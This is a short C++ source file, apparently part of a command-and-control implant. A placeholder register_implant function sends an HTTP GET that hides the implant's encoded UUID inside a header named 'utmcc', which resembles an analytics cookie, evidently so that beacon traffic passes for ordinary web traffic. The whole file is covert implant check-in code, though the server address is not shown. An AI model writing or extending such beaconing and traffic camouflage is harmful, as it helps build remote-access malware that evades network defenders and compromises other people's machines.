#include <vector>
#include <iostream>
#include "../protocols/http_wininet/http.h"

//placeholder register func. Put somehwere in control
int register_implant() {
    std::vector<char> responseBuffer;

    // Define headers (No \r\n needed)
    std::vector<std::wstring> headers = {
        //msgpack -> b64: {"implant_uuid":"00000-00...."}
        L"utmcc: gaxpbXBsYW50X3V1aWTZIzAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAw"
    };

    if (HTTP_GET(headers, responseBuffer)) {
        std::cout << "Success! Bytes read: " << responseBuffer.size() << std::endl;
    }
    else {
        std::cerr << "Request failed." << std::endl;
    }

    return 0;
}